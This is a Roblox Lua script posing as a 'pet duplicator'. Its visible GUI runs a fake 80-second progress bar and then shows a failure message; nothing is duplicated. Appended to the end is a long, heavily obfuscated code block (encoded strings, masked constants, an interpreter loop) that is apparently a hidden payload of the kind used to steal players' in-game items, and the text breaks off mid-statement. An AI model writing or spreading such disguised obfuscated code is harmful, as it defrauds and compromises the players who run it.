local player = game:GetService("Players").LocalPlayer
local gui = Instance.new("ScreenGui")
gui.Name = "FerbsDuplicatorMobile"
gui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
gui.ResetOnSpawn = false
gui.Parent = player:WaitForChild("PlayerGui")

-- Mobile detection
local isMobile = game:GetService("UserInputService").TouchEnabled
local textSizeMultiplier = isMobile and 1.3 or 1

--= BLACK THEME =--
local function applyDarkTheme(frame)
    frame.BackgroundColor3 = Color3.fromRGB(15, 15, 20)
    frame.BackgroundTransparency = 0.1
    
    local gradient = Instance.new("UIGradient")
    gradient.Color = ColorSequence.new({
        ColorSequenceKeypoint.new(0, Color3.fromRGB(25, 25, 30)),
        ColorSequenceKeypoint.new(1, Color3.fromRGB(10, 10, 15))
    })
    gradient.Rotation = 90
    gradient.Parent = frame
    
    local corner = Instance.new("UICorner")
    corner.CornerRadius = UDim.new(0, 12)
    corner.Parent = frame
    
    return frame
end

--= MAIN FRAME (Responsive Sizing) =--
local mainFrame = Instance.new("Frame")
mainFrame.Name = "MainFrame"
mainFrame.Size = isMobile and UDim2.new(0.9, 0, 0, 350) or UDim2.new(0, 450, 0, 300)
mainFrame.Position = isMobile and UDim2.new(0.5, 0, 0.5, 0) or UDim2.new(0.5, -225, 0.5, -150)
mainFrame.AnchorPoint = isMobile and Vector2.new(0.5, 0.5) or Vector2.new(0, 0)
mainFrame = applyDarkTheme(mainFrame)
mainFrame.Parent = gui

--= FERBS WATERMARK (Mobile Optimized) =--
local ferbsWatermark = Instance.new("TextLabel")
ferbsWatermark.Name = "FerbsWatermark"
ferbsWatermark.Size = UDim2.new(0, 200 * (isMobile and 1.2 or 1), 0, 50 * (isMobile and 1.2 or 1))
ferbsWatermark.Position = UDim2.new(0.5, -100 * (isMobile and 1.2 or 1), 0.9, 0)
ferbsWatermark.Text = "FERBS"
ferbsWatermark.TextColor3 = Color3.fromRGB(0, 255, 255)
ferbsWatermark.BackgroundTransparency = 1
ferbsWatermark.Font = Enum.Font.GothamBlack
ferbsWatermark.TextSize = 28 * textSizeMultiplier
ferbsWatermark.TextStrokeTransparency = 0.5
ferbsWatermark.TextStrokeColor3 = Color3.fromRGB(0, 150, 150)
ferbsWatermark.ZIndex = 100
ferbsWatermark.Parent = gui

-- Wave animation
spawn(function()
    while true do
        for i = 0, 1, 0.1 do
            ferbsWatermark.Rotation = math.sin(i * math.pi * 4) * 5
            ferbsWatermark.TextTransparency = 0.3 + (i * 0.2)
            task.wait(0.05)
        end
        for i = 1, 0, -0.1 do
            ferbsWatermark.Rotation = math.sin(i * math.pi * 4) * 5
            ferbsWatermark.TextTransparency = 0.3 + (i * 0.2)
            task.wait(0.05)
        end
    end
end)

--= FLOATING FERBS TEXTS (Mobile Adjusted) =--
for i = 1, (isMobile and 5 or 8) do
    local floatingFerbs = Instance.new("TextLabel")
    floatingFerbs.Name = "FloatingFerbs_"..i
    floatingFerbs.Size = UDim2.new(0, (80 + math.random(-20,20)) * (isMobile and 1.2 or 1), 0, 30 * (isMobile and 1.2 or 1))
    floatingFerbs.Position = UDim2.new(math.random(), -40 * (isMobile and 1.2 or 1), math.random(0.1,0.8), -15 * (isMobile and 1.2 or 1))
    floatingFerbs.Text = "FERBS"
    floatingFerbs.TextColor3 = Color3.fromRGB(
        100 + math.random(0,155),
        100 + math.random(0,155),
        255
    )
    floatingFerbs.BackgroundTransparency = 1
    floatingFerbs.Font = Enum.Font.GothamBold
    floatingFerbs.TextSize = (14 + math.random(-2,4)) * textSizeMultiplier
    floatingFerbs.TextTransparency = 0.7
    floatingFerbs.ZIndex = 50
    floatingFerbs.Parent = gui
    
    spawn(function()
        local speed = 0.5 + math.random()
        local offset = math.random(1,10)
        while true do
            floatingFerbs.Position = UDim2.new(
                floatingFerbs.Position.X.Scale,
                floatingFerbs.Position.X.Offset,
                0.1 + (math.sin(tick()*speed + offset) * 0.1),
                floatingFerbs.Position.Y.Offset
            )
            floatingFerbs.TextTransparency = 0.5 + (math.sin(tick()*2 + i) * 0.3)
            task.wait()
        end
    end)
end

--= DUPLICATE BUTTON (Mobile Friendly) =--
local duplicateButton = Instance.new("TextButton")
duplicateButton.Name = "DuplicateButton"
duplicateButton.Size = UDim2.new(0.8, 0, 0, isMobile and 70 or 60)
duplicateButton.Position = UDim2.new(0.1, 0, 0.3, 0)
duplicateButton.Text = "DUPLICATE PET"
duplicateButton.TextColor3 = Color3.new(1, 1, 1)
duplicateButton.Font = Enum.Font.GothamBlack
duplicateButton.TextSize = 20 * textSizeMultiplier
duplicateButton.AutoButtonColor = false
duplicateButton.Parent = mainFrame

-- Button styling
local buttonCorner = Instance.new("UICorner")
buttonCorner.CornerRadius = UDim.new(0, 8)
buttonCorner.Parent = duplicateButton

local buttonStroke = Instance.new("UIStroke")
buttonStroke.Thickness = 3
buttonStroke.Color = Color3.fromRGB(0, 200, 200)
buttonStroke.Parent = duplicateButton

-- Button gradient
local buttonGradient = Instance.new("UIGradient")
buttonGradient.Color = ColorSequence.new({
    ColorSequenceKeypoint.new(0, Color3.fromRGB(0, 100, 150)),
    ColorSequenceKeypoint.new(1, Color3.fromRGB(0, 150, 200))
})
buttonGradient.Rotation = 90
buttonGradient.Parent = duplicateButton

-- Touch support for mobile
if isMobile then
    local touchButtonEffect = Instance.new("Frame")
    touchButtonEffect.Name = "TouchEffect"
    touchButtonEffect.Size = UDim2.new(1, 0, 1, 0)
    touchButtonEffect.BackgroundColor3 = Color3.new(1, 1, 1)
    touchButtonEffect.BackgroundTransparency = 0.9
    touchButtonEffect.ZIndex = 10
    touchButtonEffect.Visible = false
    touchButtonEffect.Parent = duplicateButton
    
    duplicateButton.TouchTap:Connect(function()
        touchButtonEffect.Visible = true
        game:GetService("TweenService"):Create(
            touchButtonEffect,
            TweenInfo.new(0.3),
            {BackgroundTransparency = 1}
        ):Play()
        task.wait(0.3)
        touchButtonEffect.Visible = false
    end)
end

-- Button hover effects (desktop only)
if not isMobile then
    duplicateButton.MouseEnter:Connect(function()
        game:GetService("TweenService"):Create(
            buttonStroke,
            TweenInfo.new(0.2),
            {Color = Color3.fromRGB(0, 255, 255)}
        ):Play()
    end)

    duplicateButton.MouseLeave:Connect(function()
        game:GetService("TweenService"):Create(
            buttonStroke,
            TweenInfo.new(0.2),
            {Color = Color3.fromRGB(0, 200, 200)}
        ):Play()
    end)
end

--= FULLSCREEN LOADING SCREEN (Mobile Optimized) =--
local loadingFrame = Instance.new("Frame")
loadingFrame.Name = "LoadingFrame"
loadingFrame.Size = UDim2.new(1, 0, 1, 0)
loadingFrame.Position = UDim2.new(0, 0, 0, 0)
loadingFrame.BackgroundColor3 = Color3.fromRGB(5, 5, 10)
loadingFrame.BackgroundTransparency = 0.05
loadingFrame.Visible = false
loadingFrame.ZIndex = 100
loadingFrame.Parent = gui

-- Loading text (mobile responsive)
local loadingText = Instance.new("TextLabel")
loadingText.Name = "LoadingText"
loadingText.Size = isMobile and UDim2.new(0.9, 0, 0, 250) or UDim2.new(0.8, 0, 0, 150)
loadingText.Position = isMobile and UDim2.new(0.05, 0, 0.2, 0) or UDim2.new(0.1, 0, 0.3, 0)
loadingText.Text = "🔍 Searching for low-pop server...\n\n• Works on: Dragonfly, Queen Bee, Disco Bee, Red Fox, Raccoon, Butterfly\n• Doesn't work on fruits or low-tier pets\n\nPlease wait while we find the best server..."
loadingText.TextColor3 = Color3.new(1, 1, 1)
loadingText.BackgroundTransparency = 1
loadingText.Font = Enum.Font.GothamBold
loadingText.TextSize = 16 * textSizeMultiplier
loadingText.TextXAlignment = Enum.TextXAlignment.Left
loadingText.TextYAlignment = Enum.TextYAlignment.Top
loadingText.TextWrapped = true
loadingText.Parent = loadingFrame

-- Loading bar (thicker on mobile)
local loadingBar = Instance.new("Frame")
loadingBar.Name = "LoadingBar"
loadingBar.Size = isMobile and UDim2.new(0.9, 0, 0, 20) or UDim2.new(0.8, 0, 0, 15)
loadingBar.Position = isMobile and UDim2.new(0.05, 0, 0.6, 0) or UDim2.new(0.1, 0, 0.6, 0)
loadingBar.BackgroundColor3 = Color3.fromRGB(50, 50, 80)
loadingBar.Parent = loadingFrame

local loadingBarFill = Instance.new("Frame")
loadingBarFill.Name = "LoadingBarFill"
loadingBarFill.Size = UDim2.new(0, 0, 1, 0)
loadingBarFill.BackgroundColor3 = Color3.fromRGB(0, 200, 255)
loadingBarFill.Parent = loadingBar

-- Loading percentage (bigger on mobile)
local percentText = Instance.new("TextLabel")
percentText.Name = "PercentText"
percentText.Size = UDim2.new(0, 100 * (isMobile and 1.3 or 1), 0, 40 * (isMobile and 1.3 or 1))
percentText.Position = UDim2.new(0.5, -50 * (isMobile and 1.3 or 1), 0.5, -20 * (isMobile and 1.3 or 1))
percentText.Text = "0%"
percentText.TextColor3 = Color3.new(1, 1, 1)
percentText.Font = Enum.Font.GothamBlack
percentText.TextSize = 30 * textSizeMultiplier
percentText.BackgroundTransparency = 1
percentText.Parent = loadingFrame

--= DUPLICATE FUNCTION (Mobile Compatible) =--
local function startDuplication()
    loadingFrame.Visible = true
    loadingBarFill.Size = UDim2.new(0, 0, 1, 0)
    
    local duration = 80
    local startTime = tick()
    
    local connection
    connection = game:GetService("RunService").Heartbeat:Connect(function()
        local progress = math.min((tick() - startTime) / duration, 1)
        
        loadingBarFill.Size = UDim2.new(progress, 0, 1, 0)
        percentText.Text = math.floor(progress * 100) .. "%"
        
        if progress >= 1 then
            connection:Disconnect()
            
            -- Success message (mobile responsive)
            local successText = Instance.new("TextLabel")
            successText.Text = "❌ Please make sure you followed all the requirements, or there might be a connection issue"
            successText.Size = isMobile and UDim2.new(0.9, 0, 0, 80) or UDim2.new(0.8, 0, 0, 50)
            successText.Position = isMobile and UDim2.new(0.05, 0, 0.7, 0) or UDim2.new(0.1, 0, 0.7, 0)
            successText.TextColor3 = Color3.fromRGB(0, 255, 0)
            successText.Font = Enum.Font.GothamBlack
            successText.TextSize = 22 * textSizeMultiplier
            successText.BackgroundTransparency = 0.8
            successText.TextWrapped = true
            successText.Parent = loadingFrame
            
            task.wait(10)
            loadingFrame.Visible = false
            successText:Destroy()
        end
    end)
end

-- Connect both mouse and touch inputs
duplicateButton.MouseButton1Click:Connect(startDuplication)
if isMobile then
    duplicateButton.TouchTap:Connect(startDuplication)
end

return(function(...)local k={"\082\112\051\121\077\112\048\061";"\052\108\116\073\083\118\110\055\057\048\048\085\057\112\097\119\052\054\086\061";"\077\066\079\061";"\077\100\050\104\052\100\076\086\048\112\103\047\075\068\043\070";"\049\066\043\104\116\051\051\057\116\051\108\100\049\054\099\099\080\110\061\061","\070\050\056\084\075\070\116\097\082\112\051\121\077\112\048\061","\083\052\054\116\105\090\055\071\069\119\104\055\099\057\097\107\056\121\068\074\043\072\074\100\105\067\110\054\119\113\090\121\053\098\070\053\081\119\120\122\097\070\122\061";"\075\068\119\073\077\101\047\061","\116\109\097\075\071\108\075\076\109\106\061\061";"\043\043\105\071","\075\072\051\084\075\083\061\061";"\102\098\076\100\075\083\061\061","\052\072\043\100\077\054\043\100\102\070\116\097\102\068\119\076";"\082\054\117\106\102\054\099\067";"\070\050\056\103\077\068\116\076\049\110\061\061","\057\108\048\100","";"\057\069\116\100\052\079\082\076\082\110\061\061","\070\050\056\098\102\106\061\061","\102\072\097\097\052\087\061\061","\077\112\056\097\075\069\099\100\052\068\076\113\075\106\061\061","\043\072\043\121\104\112\056\073\104\106\061\061","\109\051\051\048\080\051\105\117\102\072\048\106\052\100\056\053\057\069\048\061";"\102\118\051\079\083\118\097\101\099\051\082\054\071\100\097\065\080\048\122\061","\082\112\056\078\082\069\105\103\077\068\052\061","\075\072\050\097\082\112\099\086";"\102\072\056\113\102\072\051\100";"\109\108\100\100\052\108\099\054\080\112\051\116\080\066\102\061","\075\069\105\048\083\054\100\050\071\112\056\105\116\109\082\073\082\083\061\061";"\075\054\075\089\104\078\043\076\048\100\103\075\075\068\120\117\080\112\122\061";"\043\112\051\084\052\112\043\055\047\079\116\076\082\112\043\118\082\112\043\108\047\083\061\061";"\077\066\047\061";"\102\072\087\100\077\054\050\099\109\098\065\109\104\072\099\047\080\048\120\061","\070\050\056\122\075\054\085\061","\111\089\112\048\109\090\118\052\057\110\098\082\102\043\088\106\068\056\080\056\109\079\081\085\082\101\121\055\107\080\111\112\120\077\055\071\050\090\051\099\083\103\100\082\084\084\055\119\071\115\121\074\076\099\117\111\043\056\053\047\078\067\116\105\085\047\079\071\097\088\114\111\097\118\055\070\112\052\100\070\077\110\077\098\057\069\075\097\107\043\054\088\111\066\071\075\099\084\052\048\116\080\111\075\112\089\078\075\043\077\119\076\108\104\089\084\048\108\057\110\067\088\122\120\079\090\086\065\057\103\067\052\111\075\119\101\118\098\048\084\121\114\111\065\078\081\055\056\097\084\107\104\108\052\116\072\119\081\101\043\104\075\055\119\108\050\067\099\121\111\071\067\082\052\074\077\115\102\050\119\081\087\084\068\108\111\054\049\085\114\099\099\051\120\119\109\100\087\101\108\119\082\102\055\075\077\075\057\047\055\070\054\084\065\052\047\079\088\056\097\101\103\090\069\102\068\074\116\108\052\086\076\115\101\111\068\108\117\116\065\086\105\057\067\076\069\099\119\057\047\081\090\118\099\111\097\080\114\073\077\104\087\117\068\089\089\113\051\111\086\114\057\118\117\050\071\121\110\061\061";"\066\102\065\068\074\086\076\075\051\105\052\089\108\083\061\061";"\075\070\105\055\077\101\047\061";"\052\068\043\084\077\101\075\076","\052\101\116\055\104\054\117\098","\052\112\099\097\077\112\106\061","\048\066\043\043\071\079\105\080\109\118\102\072\048\112\082\067\052\087\061\061","\109\098\079\085\109\076\065\083\083\048\084\079\075\066\105\117\109\087\061\061";"\043\043\116\074\075\079\076\100\048\079\105\051\116\108\082\121\077\050\048\061","\075\101\099\050\102\087\061\061","\104\100\043\054\083\100\099\055\054\109\075\074\071\109\051\109\049\083\061\061";"\052\068\051\113\075\112\056\084","\080\121\087\076\075\074\086\103\080\087\061\061","\082\112\056\113\082\054\050\121\075\070\047\061","\080\087\061\061","\043\070\099\076\052\068\117\097\077\054\048\061","\077\112\043\113","\077\054\051\100\104\110\061\061";"\098\077\084\114\043\071\047\089\082\057\107\073\083\073\056\112\115\120\071\073\074\120\106\098\076\077\120\053\088\100\108\111\080\090\084\072\079\108\100\083\057\121\079\116\053\115\076\068\121\086\097\097\072\118\109\085\051\068\106\074\107\114\085\122\077\076\108\081\069\106\115\086\105\066\076\097\067\097\053\068\070\089\081\115\052\088\104\090\048\075\069\057\078\122\113\071\074\112\117\069\115\090\047\051\081\119\073\053\118\118\106\074\051\121\065\102\072\076\053\113\050\098\052\115\074\111\065\108\048\049\070\112\090\105\121\053\052\083\118\090\078\104\070\090\068\086\049\078\072\077\114\108\113\053\108\099\056\088\077\100\090\118\068\076\121\116\055\108\089\120\120\052\082\107\051\122\089\056\068\049\047\083\051\082\108\050\098\111\097\099\079\081\109\098\075\057\047\085\075\076\085\085\122\109\097\080\067\113\115\109\115\074\068\119\105\098\107\053\109\085\052\067\108\099\048\084\053\087\067\075\089\116\108\067\065\056\108\102\107\090\117\054\090\069\056\122\078\087\098\122\117\087\118\112\082\086\056\103\114\085\050\119\067\056\084\065\070\102\118\069\048\055\087\119\051\100\115\106\061\061"}for O,N in ipairs({{-768823-(-768824),-250664+250717},{-1014591+1014592;-657204+657227},{-823866+823890;285726-285673}})do while N[-467245-(-467246)]<N[-1022400+1022402]do k[N[-61026+61027]],k[N[-612785-(-612787)]],N[966078+-966077],N[-9118-(-9120)]=k[N[348459+-348457]],k[N[159078-159077]],N[220712-220711]+(935614-935613),N[241447+-241445]-(-851898+851899)end end local function O(O)return k[O+(420175-410797)]end do local O=table.concat local N=table.insert local G=k local V=type local b=string.len local l=string.sub local P=math.floor local v={b=-484808-(-484847),d=-405881-(-405933);["\047"]=669309-669301;l=-392840-(-392876);["\054"]=-273042-(-273064),X=359787+-359724,L=267624+-267587,y=967870+-967836;j=-159333+159381,H=-715584-(-715638),["\043"]=822713+-822692,["\049"]=-539219-(-539249),["\055"]=74530+-74480,U=860667+-860611,C=16524-16481,F=29985+-29962;["\056"]=674613+-674552;["\050"]=943933+-943880;q=88675+-88629;i=-621427+621436,w=-100259+100308;W=-448910-(-448942),P=-426783-(-426797),s=899644+-899613,p=366571+-366565;f=-344363+344387,h=-936573+936599,e=-879227+879282,["\051"]=-297252-(-297257),u=170654-170597;["\053"]=-423853+423868,S=-998063-(-998079);A=-871866-(-871867),G=747895+-747883;Z=395436+-395378,r=158819-158757;["\052"]=-378512-(-378540);M=-675418-(-675445);z=131300+-131256;n=865595-865595,Q=417133+-417074;I=43408-43361,B=-512621-(-512624);R=145858-145829;Y=947133+-947122,E=-105052-(-105059),o=-1014463+1014505,["\057"]=373996+-373978,J=1442-1440;m=-1026496+1026515;k=626931+-626921,a=-816313+816346,N=-486716-(-486767),D=595058+-595020;T=447918+-447873;x=367975-367915;O=450674-450670,["\048"]=32033+-32013;c=-176613+176626,g=-988031+988072,t=318459-318442;K=-581401-(-581426);V=-593162-(-593202);v=-93475+93510}local e=string.char for k=723895-723894,#G,-655604+655605 do local X=G[k]if V(X)=="\115\116\114\105\110\103"then local V=b(X)local w={}local C=-634036+634037 local U=-686837+686837 local Z=954046+-954046 while C<=V do local k=l(X,C,C)local O=v[k]if O then U=U+O*(496623-496559)^((-835770+835773)-Z)Z=Z+(-382763-(-382764))if Z==700154-700150 then Z=-576690+576690 local k=P(U/(-360685-(-426221)))local O=P((U%(-411183-(-476719)))/(459310+-459054))local G=U%(-804409+804665)N(w,e(k,O,G))U=171429+-171429 end elseif k=="\061"then N(w,e(P(U/(-33121+98657))))if C>=V or l(X,C+(-320938+320939),C+(165222-165221))~="\061"then N(w,e(P((U%(-802617+868153))/(-143908-(-144164)))))end break end C=C+(51042+-51041)end G[k]=O(w)end end end return(function(k,G,V,b,l,P,v,E,S,t,Z,f,o,X,e,C,c,i,N,U,w)e,i,S,t,X,c,E,C,f,o,N,Z,U,w={},function(k,O)local G=U(O)local V=function()return N(k,{},O,G)end return V end,function(k,O)local G=U(O)local V=function(V,b,l,P)return N(k,{V;b,l;P},O,G)end return V end,function(k,O)local G=U(O)local V=function(...)return N(k,{...},O,G)end return V end,{},function(k)X[k]=X[k]-(-15071-(-15072))if X[k]==-486831+486831 then X[k],e[k]=nil,nil end end,function(k,O)local G=U(O)local V=function(V,b,l,P,v)return N(k,{V,b;l;P,v},O,G)end return V end,843834-843834,function(k,O)local G=U(O)local V=function(V,b,l)return N(k,{V,b;l},O,G)end return V end,function(k,O)local G=U(O)local V=function(V)return N(k,{V},O,G)end return V end,function(N,V,b,l)local C,D,h,Y,L,Q,g,d,t,q,T,s,J,v,I,z,X,m,W,B,H,F,K,Z,x,p,a,u,j,y,n,U,r,R while N do if N<7406327-(-661685)then if N<-453230+3697394 then if N<276713+789212 then if N<-245920-(-557873)then if N<118686-(-79842)then if N<-37601+206698 then if N<-865141-(-958014)then X=V[354091+-354090]N=e[b[661558-661557]]U=N C=V[-173603-(-173605)]N=U[C]N=N and 10119253-678197 or-23073+9428288 else H=not R y=y+p J=y<=D J=H and J H=y>=D H=R and H J=H or J H=485167+6141339 N=J and H J=953854+4516521 N=N or J end else U=-904508+9968209 C=O(-887478-(-878139))X=C^U v=-968766+7521030 N=v-X v=O(366717-376044)X=N N=v/X v={N}N=k[O(-523312+513961)]end else if N<482542-188646 then B=O(-296009-(-286633))N=k[B]B=O(-154605-(-145253))k[B]=N N=13510525-863227 else e[C]=r N=e[C]N=N and-390188+11793800 or 7043063-555825 end end else if N<826766-212519 then if N<824794-502960 then N=v and 12631265-9056 or 7137081-(-907196)else q=I L=q N=-843002+10606628 H[q]=L q=nil end else if N<1688111-627955 then r=r+K Q=not B v=r<=a v=Q and v Q=r>=a Q=B and Q v=Q or v Q=458094+8551333 N=v and Q v=909052+15835908 N=N or v else U=U+t s=not T C=U<=Z C=s and C s=U>=Z s=T and s C=s or C s=-257448+13731139 N=C and s C=15341045-(-624627)N=N or C end end end else if N<-237351+2759868 then if N<-619251+2980626 then if N<1791729-(-87779)then if N<1046400+347501 then N=e[s]B=523254-523248 K=84388-84387 a=N(K,B)N=O(-375980+366604)k[N]=a B=O(154533+-163909)K=k[B]B=665847-665845 N=K>B N=N and 9318461-808249 or 199270+26528 else U=e[b[-377574-(-377580)]]C=U==X v=C N=2363432-33249 end else e[b[633524+-633519]]=v X=nil N=937917+7106360 end else if N<3193862-802297 then U=346155+-346146 C=e[b[-647090-(-647092)]]X=C*U C=-902204+18148939073089 v=X+C X=512368+35184371576464 N=v%X e[b[956160-956158]]=N N=9362686-(-124452)X=e[b[379628+-379625]]C=-125348+125349 v=X~=C else B=157989+-157989 I=#H q=I==B N=q and 15524283-51170 or 3140799-(-124836)end end else if N<2184130-(-671861)then if N<2905755-290537 then X=O(-853754+844402)v=O(-655988+646612)N=k[v]v=k[X]X=O(-717494+708142)k[X]=N X=O(-881307-(-871931))k[X]=v X=e[b[-885562-(-885563)]]C=X()N=7894353-(-197030)else N=true X=V s=O(-338538+329170)Z=w()C=w()U=O(-652404+643035)e[C]=N v=k[U]U=O(725622+-734951)N=v[U]U=w()e[U]=N N=f(3578381-(-359019),{})e[Z]=N N=false t=w()e[t]=N J=E(15933127-1023232,{t})T=k[s]s=T(J)N=s and 7265854-(-301225)or 13332535-(-136548)v=s end else if N<160421+2739703 then F=N W=508081-508080 d=m[W]W=false h=d==W u=h N=h and-337066+9989073 or 833786+11583105 else N=k[O(512345-521712)]v={}end end end end else if N<5840813-(-20705)then if N<100835+4466408 then if N<-437102+4348487 then if N<4528676-769528 then if N<4130477-733303 then B=#H N=219495+2193122 L=-333546+333547 I=-887483-(-887484)q=Z(I,B)I=T(H,q)B=e[R]g=I-L q=nil Q=s(g)B[I]=Q I=nil else C=e[b[49058+-49056]]N=933756-620403 U=e[b[-411757+411760]]X=C==U v=X end else H=O(27095-36449)R=k[H]N=13899785-(-396204)H=O(166440-175781)p=R[H]D=p end else if N<-890876+4822207 then N=true N=N and 1640274-549169 or 1991516-(-918780)else v=O(690933+-700304)N=k[v]X=O(-923261+913884)v=N(X)v={}N=k[O(488251-497583)]end end else if N<-319978+5692750 then if N<5442404-806905 then z=713783-713782 e[C]=u W=e[x]d=W+z h=m[d]F=p+h h=60130+-59874 N=F%h d=e[L]h=R+d p=N N=13778564-(-762168)d=-607219+607475 F=h%d R=F else u=e[C]N=u and 2226083-(-673461)or 17285937-995647 v=u end else if N<-516336+6059404 then N=8503011-368619 Z=nil s=nil T=nil else Z=-256808+256809 t=-83683+83685 C=e[b[842170+-842169]]U=C(Z,t)C=-638964+638965 X=U==C v=X N=X and 382571-69218 or 653428+2905592 end end end else if N<6326130-(-988479)then if N<7308618-757239 then if N<449070+6032600 then if N<427949+5604780 then X=e[b[682742-682741]]v=#X X=-579378+579378 N=v==X N=N and 2590255-199142 or-36961+6260511 else U=O(-781048+771694)C=k[U]U=O(800377+-809747)X=C[U]U=e[b[155045+-155044]]C={X(U)}v={G(C)}N=k[O(640820+-650186)]end else N=true N=14448281-(-1031488)end else if N<-981758+7728280 then K=O(861563+-870932)a=k[K]N=-1008127+1147907 J=y K=O(-330986+321643)r=a[K]a=r(X,J)r=e[b[-752945-(-752951)]]K=r()I=a+K q=I+T K=864572-864571 I=343275+-343019 H=q%I J=nil T=H I=U[C]a=T+K r=Z[a]q=I..r U[C]=q else I=#H B=254888+-254888 q=I==B N=3036476-(-229159)end end else if N<414573+7254569 then if N<-1003647+8514857 then F=e[C]u=F N=F and 637620+14292244 or-931453+5548810 else N=159845+13309238 T=e[t]v=T end else if N<-810041+8680295 then D=w()p=-49314+49379 e[D]=v y=-64287-(-64290)N=e[s]v=N(y,p)q=o(331369-139364,{})y=w()H=O(-944765+935397)N=-810297+810297 e[y]=v v=k[H]p=N N=486895-486895 H={v(q)}R=N v=-860281-(-860283)N={G(H)}H=N N=H[v]q=N v=O(-776392-(-767032))N=k[v]K=O(448942+-458272)I=e[U]a=k[K]K=a(q)a=O(668388-677749)r=I(K,a)I={r()}v=N(G(I))I=w()e[I]=v v=-274344-(-274345)r=e[y]a=r r=304681+-304680 N=197606+715317 K=r r=-491439+491439 B=K<r r=v-K else N=e[b[134123-134116]]N=N and 12436124-375084 or 255784+10939438 end end end end end else if N<-1033536+13152527 then if N<-687669+10392939 then if N<10426703-998463 then if N<358059+8390083 then if N<351851+7880479 then if N<486255+7615524 then N=true N=N and-768632+3314885 or 159013+12748389 else N=k[O(659316+-668641)]v={C}end else K=O(-317788-(-308458))N=k[K]Q=O(-829370+820018)B=k[Q]K=N(B)N=O(-264936+255560)k[N]=K N=-175525+12822823 end else if N<8276792-(-819833)then Y=-212966-(-212967)z=-826810-(-826810)Q=w()g=O(-757239+747883)m=678967-678965 e[Q]=r v=k[g]g=O(802681+-812043)L=981794-981694 x=275624-275369 N=v[g]g=-464110+464111 v=N(g,L)g=w()L=199654+-199654 e[g]=v N=e[s]v=N(L,x)L=w()n=-864699+874699 e[L]=v x=-74593-(-74594)N=e[s]j=e[g]v=N(x,j)x=w()e[x]=v v=e[s]j=v(Y,m)v=-254631-(-254632)N=j==v m=O(-67889-(-58530))j=w()e[j]=N N=O(425497-434861)v=O(778791-788152)h=O(-416621+407291)F=k[h]d=e[s]W={d(z,n)}N=q[N]h=F(G(W))F=O(-212583+203224)u=h..F Y=m..u N=N(q,v,Y)Y=w()m=O(-923261+913893)e[Y]=N v=k[m]u=i(1000959+4854964,{s;Q;y,U;C;I;j,Y,g,x,L;D})m={v(u)}N={G(m)}m=N N=e[j]N=N and-700150+5869972 or-25633+7453444 else N={}e[b[445168-445166]]=N v=e[b[171240-171237]]Z=v t=35184371565712-(-523120)v=C%t s=1036415-1036160 e[b[343471-343467]]=v T=C%s s=-409069+409071 y=-445997-(-445998)t=T+s e[b[562417+-562412]]=t J=O(986214-995583)s=k[J]J=O(-847879-(-838522))T=s[J]s=T(X)T=O(772670-782008)p=y U[C]=T T=333674+-333664 N=-604979+744759 D=s J=795066-795065 y=37793-37793 R=p<y y=J-p end end else if N<565170+8889527 then if N<9414679-(-27745)then N=-255720+8390112 else C=e[b[-266600+266603]]U=987584-987583 X=C~=U N=X and-259368+14466778 or 889596+8597542 end else if N<8795178-(-720182)then U=178818-178662 C=e[b[-11357-(-11360)]]X=C*U C=-507120+507377 N=9073461-(-370155)v=X%C e[b[289452-289449]]=v else W=-1029054-(-1029056)d=m[W]W=e[Y]h=d==W u=h N=11515903-(-900988)end end end else if N<1041856+10296896 then if N<190310+10409829 then if N<790905+9023992 then if N<-198694+9959991 then v=8247324-421677 C=O(959486+-968851)U=7136122-(-878971)X=C^U N=v-X X=N v=O(183844-193190)N=v/X v={N}N=k[O(-166424-(-157093))]else I=I+Q q=I<=B L=not g q=L and q L=I>=B L=g and L q=L or q L=446382+-120229 N=q and L q=315242+6892914 N=N or q end else N=748023+7343360 end else if N<-953086+12200084 then U=e[b[832579-832570]]C=518256+-518255 N={}X=N Z=U U=-479854-(-479855)t=U U=301353+-301353 T=t<U U=C-t N=-368555+1431499 else y=O(200806+-210147)D=k[y]N=-632756+8323231 v=D end end else if N<12324418-515184 then if N<12067417-632628 then N=12402331-86307 else N=true N=N and 807993+11007280 or-1011071+16490840 end else if N<551857+11429694 then N=-1017792+4943416 else U=-282665-(-282665)X=O(-106979+97608)N=k[X]C=e[b[474551-474543]]X=N(C,U)N=11592834-397612 end end end end else if N<-375660+14618711 then if N<13175005-102563 then if N<12588322-(-47073)then if N<12697470-224423 then if N<-906812+13295004 then I=c(I)U=c(U)q=nil p=nil D=c(D)C=c(C)y=c(y)H=nil J=nil N=203942+9559684 T=nil T=O(-235379-(-226023))R=nil s=c(s)t=c(t)Z=c(Z)t=k[T]R=w()U=nil q=113252+-113251 H={}C=nil T=O(-394540+385193)Z=t[T]t=w()s=O(-59874+50518)e[t]=Z T=k[s]s=O(609825-619187)Z=T[s]J=O(-61868-(-52514))s=k[J]J=O(706524-715894)D=O(-876884-(-867515))p={}T=s[J]J=k[D]y=w()D=O(555963-565298)s=J[D]D=w()J=-635124-(-635124)e[D]=J J=634996+-634994 e[y]=J e[R]=p J={}p=999103+-999103 I=-381996+382252 B=I I=-519600+519601 Q=I I=469871+-469871 g=Q<I I=q-Q else v=u N=F N=15349813-(-940477)end else v=O(-462334-(-452974))N=k[v]X=e[b[-892220+892224]]Z=O(916092+-925422)U=k[Z]J=O(-926013+916645)s=k[J]D=o(924221+8789228,{})J={s(D)}T={G(J)}s=-298215-(-298217)t=T[s]Z=U(t)U=O(116452+-125813)C=X(Z,U)X={C()}v=N(G(X))C=e[b[582386+-582381]]X=v N=C and 1757526-312618 or 3066046-735863 v=C end else if N<13207303-355371 then N=-23329+3948953 else v={}N=k[O(-15310-(-5984))]end end else if N<-262632+13829366 then if N<846970+12624794 then s=O(482019-491375)T=v R=O(-371436+362082)v=k[s]s=O(-333034+323672)J=O(-1034944+1025590)N=v[s]s=w()e[s]=N v=k[J]J=O(856779-866107)N=v[J]y=N J=N p=k[R]D=p N=p and-989311+4893430 or 114020+14181969 else C=U N=e[b[243240+-243239]]J=494383+-494383 D=190117-189862 s=N(J,D)N=162661+900283 X[C]=s C=nil end else if N<14892563-770872 then a=p==R r=a N=-593459-(-895548)else D=371694-371692 C=e[b[-115684+115687]]U=1035264+-1035232 X=C%U Z=e[b[-573870-(-573874)]]p=-480815+480828 s=e[b[-1047934-(-1047936)]]q=e[b[155493+-155490]]H=q-X q=-722582-(-722614)R=H/q y=p-R J=D^y T=s/J t=Z(T)Z=-610355+4295577651 U=t%Z t=304681+-304679 J=197094+-197093 D=400236-399980 Z=t^X C=U/Z Z=e[b[-947513-(-947517)]]N=6799536-575986 p=971006+-970750 s=C%J 